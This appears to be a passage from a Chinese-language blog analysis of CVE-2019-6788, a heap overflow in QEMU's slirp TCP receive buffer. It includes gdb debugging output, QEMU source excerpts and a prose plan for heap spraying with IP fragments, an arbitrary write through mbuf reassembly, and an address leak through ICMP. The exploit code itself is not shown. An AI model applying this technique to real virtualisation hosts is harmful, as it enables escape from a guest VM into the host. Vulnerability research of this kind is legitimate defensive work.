&#125;,</span><br><span class="line">      ih_dst = &#123;</span><br><span class="line">        s_addr = 0x202000a</span><br><span class="line">      &#125;,</span><br><span class="line">      ih_x1 = 0x0,</span><br><span class="line">      ih_pr = 0x6</span><br><span class="line">    &#125;,</span><br><span class="line">    ti_i6 = &#123;</span><br><span class="line">      ih_src = &#123;</span><br><span class="line">        __in6_u = &#123;</span><br><span class="line">          __u6_addr8 = <span class="string">"\n\000\002\017\n\000\002\002\000\006\000\000\000\000\000"</span>,</span><br><span class="line">          __u6_addr16 = &#123;0xa, 0xf02, 0xa, 0x202, 0x600, 0x0, 0x0, 0x0&#125;,</span><br><span class="line">          __u6_addr32 = &#123;0xf02000a, 0x202000a, 0x600, 0x0&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      ih_dst = &#123;</span><br><span class="line">        __in6_u = &#123;</span><br><span class="line">          __u6_addr8 = <span class="string">'\000'</span> &lt;repeats 15 <span class="built_in">times</span>&gt;,</span><br><span class="line">          __u6_addr16 = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;,</span><br><span class="line">          __u6_addr32 = &#123;0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      ih_x1 = 0x0,</span><br><span class="line">      ih_nh = 0x0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  ti_x0 = 0x0,</span><br><span class="line">  ti_len = 0x500,//输入长度</span><br><span class="line">  ti_t = &#123;</span><br><span class="line">    th_sport = 0x2e4,</span><br><span class="line">    th_dport = 0x7100,</span><br><span class="line">    th_seq = 0x4cc0331,</span><br><span class="line">    th_ack = 0x271002,</span><br><span class="line">    th_x2 = 0x0,</span><br><span class="line">    th_off = 0x5,</span><br><span class="line">    th_flags = 0x18,</span><br><span class="line">    th_win = 0x7210,</span><br><span class="line">    th_sum = 0xef00,</span><br><span class="line">    th_urp = 0x0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x2238 (<span class="string">'8"'</span>)</span><br><span class="line">RBX: 0x7f3f7821fcf0 (0x00007f3f7821fcf0)</span><br><span class="line">RCX: 0x2238 (<span class="string">'8"'</span>)</span><br><span class="line">RDX: 0x500</span><br><span class="line">RSI: 0x7f3f877fa770 --&gt; 0x202000a71000002</span><br><span class="line">RDI: 0x7f3f78214e38 --&gt; 0x202000a71000002</span><br><span class="line">RBP: 0x7f3f877fa830 --&gt; 0x7f3f877fa880 --&gt; 0x7f3f877fa8c0 --&gt; 0x7f3f877fa910 --&gt; 0x7f3f877fa960 --&gt; 0x7f3f877fa9a0 (--&gt; ...)</span><br><span class="line">RSP: 0x7f3f877fa5f0 --&gt; 0x7f3f877fa630 --&gt; 0x544877fa6a0</span><br><span class="line">RIP: 0x55ea3f7d0a12 (&lt;tcp_input+3115&gt;:  cmp    edx,eax)</span><br><span class="line">R8 : 0x14</span><br><span class="line">R9 : 0x7f3f7820d680 --&gt; 0x600</span><br><span class="line">R10: 0x7f3f877fabe0 --&gt; 0x0</span><br><span class="line">R11: 0x7f3f7820db94 (<span class="string">'A'</span> &lt;repeats 32 <span class="built_in">times</span>&gt;)</span><br><span class="line">R12: 0x7f3f7820d670 --&gt; 0x0</span><br><span class="line">R13: 0x18</span><br><span class="line">R14: 0x55ea40ff9710 --&gt; 0x55ea40ff9500 --&gt; 0x0</span><br><span class="line">R15: 0x7ffe46247360 --&gt; 0x0</span><br><span class="line">EFLAGS: 0x202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x55ea3f7d0a08 &lt;tcp_input+3105&gt;:     mov    eax,DWORD PTR [rax+0x158]</span><br><span class="line">   0x55ea3f7d0a0e &lt;tcp_input+3111&gt;:     sub    ecx,eax</span><br><span class="line">   0x55ea3f7d0a10 &lt;tcp_input+3113&gt;:     mov    eax,ecx</span><br><span class="line">=&gt; 0x55ea3f7d0a12 &lt;tcp_input+3115&gt;:     cmp    edx,eax</span><br><span class="line">   0x55ea3f7d0a14 &lt;tcp_input+3117&gt;:     ja     0x55ea3f7d0aac &lt;tcp_input+3269&gt;</span><br><span class="line">   0x55ea3f7d0a1a &lt;tcp_input+3123&gt;:     mov    edx,DWORD PTR [rbx+0x98]</span><br><span class="line">   0x55ea3f7d0a20 &lt;tcp_input+3129&gt;:     movzx  eax,WORD PTR [r12+0x2e]</span><br><span class="line">   0x55ea3f7d0a26 &lt;tcp_input+3135&gt;:     movzx  eax,ax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br></pre></td></tr></table></figure>
<p>断点第二次断到了拷贝函数，拷贝之后我们可以看到sb_wptr已经存放了输入数据，而sb_cc仍为0，而比较函数仍可以通过。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p *so_rcv</span><br><span class="line"><span class="variable">$8</span> = &#123;</span><br><span class="line">  sb_cc = 0x0,</span><br><span class="line">  sb_datalen = 0x2238,</span><br><span class="line">  sb_wptr = 0x7f3f78205400 <span class="string">"d"</span>,</span><br><span class="line">  sb_rptr = 0x7f3f78204f00 <span class="string">'A'</span> &lt;repeats 200 <span class="built_in">times</span>&gt;...,</span><br><span class="line">  sb_data = 0x7f3f78204f00 <span class="string">'A'</span> &lt;repeats 200 <span class="built_in">times</span>&gt;...</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ p *m</span><br><span class="line"><span class="variable">$9</span> = &#123;</span><br><span class="line">  m_next = 0x7f3f78208a70, </span><br><span class="line">  m_prev = 0x55ea40fc04a8, </span><br><span class="line">  m_nextpkt = 0x0, </span><br><span class="line">  m_prevpkt = 0x0, </span><br><span class="line">  m_flags = 0x4, </span><br><span class="line">  m_size = 0x608, </span><br><span class="line">  m_so = 0x7f3f78214e00, </span><br><span class="line">  m_data = 0x7f3f7820d6b4 <span class="string">'A'</span> &lt;repeats 200 <span class="built_in">times</span>&gt;..., </span><br><span class="line">  m_len = 0x500, </span><br><span class="line">  slirp = 0x55ea40fc0400, </span><br><span class="line">  resolution_requested = 0x0, </span><br><span class="line">  expiration_date = 0xffffffffffffffff, </span><br><span class="line">  m_ext = 0x0, </span><br><span class="line">  m_dat = 0x7f3f7820d660 <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
<p>再过一次拷贝,sb_wptr继续递增，直到超出分配的0x2238的空间，最终覆盖某些关键数据结构造成crash。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p* so_rcv</span><br><span class="line">$14 = &#123;</span><br><span class="line">  sb_cc = 0x0, </span><br><span class="line">  sb_datalen = 0x2238, </span><br><span class="line">  sb_wptr = 0x7f3f78205900 &quot;\264&quot;, </span><br><span class="line">  sb_rptr = 0x7f3f78205900 &quot;\264&quot;, </span><br><span class="line">  sb_data = 0x7f3f78204f00 &apos;A&apos; &lt;repeats 200 times&gt;...</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ p* m</span><br><span class="line">$15 = &#123;</span><br><span class="line">  m_next = 0x7f3f78213600, </span><br><span class="line">  m_prev = 0x55ea40fc04a8, </span><br><span class="line">  m_nextpkt = 0x0, </span><br><span class="line">  m_prevpkt = 0x0, </span><br><span class="line">  m_flags = 0x4, </span><br><span class="line">  m_size = 0x608, </span><br><span class="line">  m_so = 0x7f3f7850c000, </span><br><span class="line">  m_data = 0x7f3f78208b24 &apos;A&apos; &lt;repeats 200 times&gt;..., </span><br><span class="line">  m_len = 0x500, </span><br><span class="line">  slirp = 0x55ea40fc0400, </span><br><span class="line">  resolution_requested = 0x0, </span><br><span class="line">  expiration_date = 0xffffffffffffffff, </span><br><span class="line">  m_ext = 0x0, </span><br><span class="line">  m_dat = 0x7f3f78208ad0 &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ x/8gx 0x7f3f78204f00-0x10</span><br><span class="line">0x7f3f78204ef0: 0x0000000000000000      0x0000000000002245</span><br><span class="line">0x7f3f78204f00: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x7f3f78204f10: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x7f3f78204f20: 0x4141414141414141      0x414141414141414</span><br></pre></td></tr></table></figure></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里的exp是分析的raycp师傅的，因为编译环境和运行环境不太一样，中间调整了一些变量的值。</p>
<h3 id="malloc原语"><a href="#malloc原语" class="headerlink" title="malloc原语"></a>malloc原语</h3><p>qemu的堆排布非常复杂，我们想要控制堆，就需要先将空闲的堆块分配完，之后从top_chunk开始分配，方可通过可控的堆溢出覆写某些数据结构。首先让我们重温一下IP协议。</p>
<p>如下图所示是一个IP数据包的示意图，linux下的数据结构对应图里的各个字段。</p>
<p>重点关注<code>Flags</code>字段和<code>Fragment Offset</code>字段。</p>
<ol>
<li>Zero:Unused，置为0</li>
<li>Do not fragment flag:表示数据包是否为分片数据包，当置为1时，表示未分片，简写为DF位</li>
<li>More fragments following flag:表示后续还有没无分包，有的话置为1，简写为MF位</li>
<li>Fragment Offset：当前数据包在整个大数据包中的偏移offset。</li>
</ol>
<p>IP包的total_length用2字节表示，因此一个IP数据包最大为65535字节，一旦要发送大量数据时我们需要对数据包进行分段传输，我们看下qemu对于这部分功能的实现。</p>
<p><img src="/2021/01/02/cve-2019-6788/1.jpg" alt=""></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Structure of an internet header, naked of options.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We declare ip_len and ip_off to be short, rather than u_short</span></span><br><span class="line"><span class="comment"> * pragmatically since otherwise unsigned comparisons can result</span></span><br><span class="line"><span class="comment"> * against negative integers quite easily, and fail in subtle ways.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BYTE_ORDER == LITTLE_ENDIAN </span></span><br><span class="line">    u_char  ip_hl:<span class="number">4</span>,        <span class="comment">/* header length */</span></span><br><span class="line">        ip_v:<span class="number">4</span>;         <span class="comment">/* version */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BYTE_ORDER == BIG_ENDIAN </span></span><br><span class="line">    u_char  ip_v:<span class="number">4</span>,         <span class="comment">/* version */</span></span><br><span class="line">        ip_hl:<span class="number">4</span>;        <span class="comment">/* header length */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    u_char  ip_tos;         <span class="comment">/* type of service */</span></span><br><span class="line">    <span class="keyword">short</span>   ip_len;         <span class="comment">/* total length */</span></span><br><span class="line">    u_short ip_id;          <span class="comment">/* identification */</span></span><br><span class="line">    <span class="keyword">short</span>   ip_off;         <span class="comment">/* fragment offset field */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IP_DF 0x4000            <span class="comment">/* dont fragment flag */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IP_MF 0x2000            <span class="comment">/* more fragments flag */</span></span></span><br><span class="line">    u_char  ip_ttl;         <span class="comment">/* time to live */</span></span><br><span class="line">    u_char  ip_p;           <span class="comment">/* protocol */</span></span><br><span class="line">    u_short ip_sum;         <span class="comment">/* checksum */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span> <span class="title">ip_src</span>,<span class="title">ip_dst</span>;</span>  <span class="comment">/* source and dest address */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>该函数位于<code>slirp/ip_input.c</code>中，每次遇到一个分片的数据包时(IP_DF=0)，分配一个mbuf指针类型的链表用以存放分包，这里的<code>g_malloc</code>经过调试分配的大小为<code>0x668</code>。</p>
<p>因此我们构造DF=0的IP协议包，多次发送清空空闲内存。(这里的链表指针只有当接收到最后一个数据包后才会在<code>m_cat</code>函数中拼接所有数据包并释放链表)。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">ip_input(struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If offset or IP_MF are set, must reassemble.</span></span><br><span class="line"><span class="comment">	 * Otherwise, nothing need be done.</span></span><br><span class="line"><span class="comment">	 * (We could look in the reassembly queue to see</span></span><br><span class="line"><span class="comment">	 * if the packet was previously fragmented,</span></span><br><span class="line"><span class="comment">	 * but it's not worth the time; just let them time out.)</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * XXX This should fail, don't fragment yet</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123;</span><br><span class="line">	  <span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">qlink</span> *<span class="title">l</span>;</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Look for queue of fragments</span></span><br><span class="line"><span class="comment">		 * of this datagram.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;</span><br><span class="line">		     l = l-&gt;next) &#123;</span><br><span class="line">            fp = container_of(l, struct ipq, ip_link);</span><br><span class="line">            <span class="keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_p == fp-&gt;ipq_p)</span><br><span class="line">		    <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">        fp = <span class="literal">NULL</span>;</span><br><span class="line">	found:</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Adjust ip_len to not reflect header,</span></span><br><span class="line"><span class="comment">		 * set ip_mff if more fragments are expected,</span></span><br><span class="line"><span class="comment">		 * convert offset of this to bytes.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ip-&gt;ip_len -= hlen;</span><br><span class="line">		<span class="keyword">if</span> (ip-&gt;ip_off &amp; IP_MF)</span><br><span class="line">		  ip-&gt;ip_tos |= <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		  ip-&gt;ip_tos &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		ip-&gt;ip_off &lt;&lt;= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If datagram marked as having more fragments</span></span><br><span class="line"><span class="comment">		 * or if this is not the first fragment,</span></span><br><span class="line"><span class="comment">		 * attempt reassembly; if it succeeds, proceed.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (ip-&gt;ip_tos &amp; <span class="number">1</span> || ip-&gt;ip_off) &#123;</span><br><span class="line">			ip = ip_reass(slirp, ip, fp);</span><br><span class="line">                        <span class="keyword">if</span> (ip == <span class="literal">NULL</span>)</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			m = dtom(slirp, ip);</span><br><span class="line">		&#125; <span class="keyword">else</span></span><br><span class="line">			<span class="keyword">if</span> (fp)</span><br><span class="line">		   	   ip_freef(slirp, fp);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *</span></span><br><span class="line"><span class="class"><span class="title">ip_reass</span>(<span class="title">Slirp</span> *<span class="title">slirp</span>, <span class="title">struct</span> <span class="title">ip</span> *<span class="title">ip</span>, <span class="title">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If first fragment to arrive, create a reassembly queue.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">        <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">t</span> = <span class="title">m_get</span>(<span class="title">slirp</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *</span></span><br><span class="line"><span class="class"><span class="title">m_get</span>(<span class="title">Slirp</span> *<span class="title">slirp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m</span>;</span></span><br><span class="line">	<span class="keyword">int</span> flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	DEBUG_CALL(<span class="string">"m_get"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (slirp-&gt;m_freelist.qh_link == &amp;slirp-&gt;m_freelist) &#123;</span><br><span class="line">                m = g_malloc(SLIRP_MSIZE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/cve-2019-6788/4.png" alt=""></p>
<p><img src="/2021/01/02/cve-2019-6788/5.png" alt=""></p>
<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>任意地址写基于堆溢出，我们回顾一下刚才的<code>ip_input</code>函数，当IP_DF为0时调用<code>ip_reass</code>函数。当IP_MF不为1时(这里有个问题是为什么拿ipf_tos表示，正常对应ip包的service type位)，即当前数据包为分包的最后一个，进入下面的循环进行链表数据包的拼接。</p>
<p>假设我们可以控制m-&gt;m_data以及m-&gt;m_len和n-&gt;m_data，就可以通过<code>memcpy(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len);</code>拷贝可控数据到任意地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *</span></span><br><span class="line"><span class="class"><span class="title">ip_reass</span>(<span class="title">Slirp</span> *<span class="title">slirp</span>, <span class="title">struct</span> <span class="title">ip</span> *<span class="title">ip</span>, <span class="title">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">if</span> (((struct ipasfrag *)(q-&gt;ipf_prev))-&gt;ipf_tos &amp; <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Reassembly is complete; concatenate fragments.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    q = fp-&gt;frag_link.next;</span><br><span class="line">	m = dtom(slirp, q);</span><br><span class="line"></span><br><span class="line">	q = (struct ipasfrag *) q-&gt;ipf_next;</span><br><span class="line">	<span class="keyword">while</span> (q != (struct ipasfrag*)&amp;fp-&gt;frag_link) &#123;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">t</span> = <span class="title">dtom</span>(<span class="title">slirp</span>, <span class="title">q</span>);</span></span><br><span class="line">	  q = (struct ipasfrag *) q-&gt;ipf_next;</span><br><span class="line">	  m_cat(m, t);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">m_cat(struct mbuf *m, struct mbuf *n)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If there's no room, realloc</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (M_FREEROOM(m) &lt; n-&gt;m_len)</span><br><span class="line">		m_inc(m, m-&gt;m_len + n-&gt;m_len);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len);</span><br><span class="line">	m-&gt;m_len += n-&gt;m_len;</span><br><span class="line"></span><br><span class="line">	m_free(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp中的arb_write逻辑如下。首先spray多次调用malloc清空堆内存，同主机建立connection从而申请得到so_rcv结构体，再发送一个MF为1的数据包，id为0xdead，触发分配0x668的mbuf，这个数据包刚好位于so_rcv的后面，我们通过write堆溢出覆写其m_data部分为指定地址(这里也可以部分写低地址)。之后再发送一个id相同，MF为0的数据包，触发合并，memcpy调用，<code>send_ip_pkt(&amp;pkt_info, write_data, write_data_len);</code>将指定数据拷贝到m_data所在的地址。</p>
<h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>泄露地址这个方法感觉非常巧妙，是拿icmp的响应包来实现的，既然都复习了IP协议，不妨多来看一眼tcp协议和icmp协议。如下图所示。</p>
<p>字段就不过多解释了，方便看exp的时候能对照上。</p>
<p><img src="/2021/01/02/cve-2019-6788/2.jpg" alt=""></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line"> * TCP header.</span><br><span class="line"> * Per RFC <span class="number">793</span>, September, <span class="number">1981.</span></span><br><span class="line"> */</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> &#123;</span></span><br><span class="line">    u_short th_sport;       <span class="comment">/* source port */</span></span><br><span class="line">    u_short th_dport;       <span class="comment">/* destination port */</span></span><br><span class="line">    tcp_seq th_seq;         <span class="comment">/* sequence number */</span></span><br><span class="line">    tcp_seq th_ack;         <span class="comment">/* acknowledgement number */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BYTE_ORDER == LITTLE_ENDIAN </span></span><br><span class="line">    u_char  th_x2:<span class="number">4</span>,        <span class="comment">/* (unused) */</span></span><br><span class="line">        th_off:<span class="number">4</span>;       <span class="comment">/* data offset */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BYTE_ORDER == BIG_ENDIAN </span></span><br><span class="line">    u_char  th_off:<span class="number">4</span>,       <span class="comment">/* data offset */</span></span><br><span class="line">        th_x2:<span class="number">4</span>;        <span class="comment">/* (unused) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    u_char  th_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_FIN  0x01</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_SYN  0x02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_RST  0x04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_PUSH 0x08</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_ACK  0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TH_URG  0x20</span></span><br><span class="line">    u_short th_win;         <span class="comment">/* window */</span></span><br><span class="line">    u_short th_sum;         <span class="comment">/* checksum */</span></span><br><span class="line">    u_short th_urp;         <span class="comment">/* urgent pointer */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/cve-2019-6788/3.png" alt=""></p>
